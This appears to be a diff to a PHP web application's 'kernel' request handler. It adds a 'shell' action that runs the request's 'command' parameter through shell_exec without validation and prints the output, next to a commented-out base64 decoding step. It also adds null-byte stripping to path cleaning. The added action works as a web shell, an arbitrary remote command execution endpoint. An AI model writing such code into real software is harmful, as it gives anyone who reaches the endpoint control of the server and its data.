@@ -57,6 +57,10 @@ class kernel {
 				$content=isset($r["content"]) ? $r["content"] : die();
 				$this->writeIni($filename,$content);
 				break;
+			case "shell":
+				$command=isset($r["command"]) ? $r["command"] : "";
+				$this->shell($command);
+				break;
 			case "logout":
 				$this->logout();
 				break;
@@ -64,6 +68,14 @@ class kernel {
 				$this->listPrograms();
 				break;
 		}
+	}
+	
+	function shell($command) {
+		//$command=base64_decode($command);
+		if ($command === false) {
+			die();
+		}
+		echo shell_exec($command);
 	}
 	
 	function listUsers() {
@@ -240,7 +252,7 @@ class kernel {
 		$path=explode("/",$path);
 		$buffer=array();
 		foreach ($path as $p) {
-			$p=str_replace(array("~","\\","./"),"",$p);
+			$p=str_replace(array("~","\\","./",chr(0)),'',$p);
 			$p=preg_replace('/\.{2,}/','.',$p);
 			if ($p!="" && $p!=".") {
 				$buffer[]=$p;
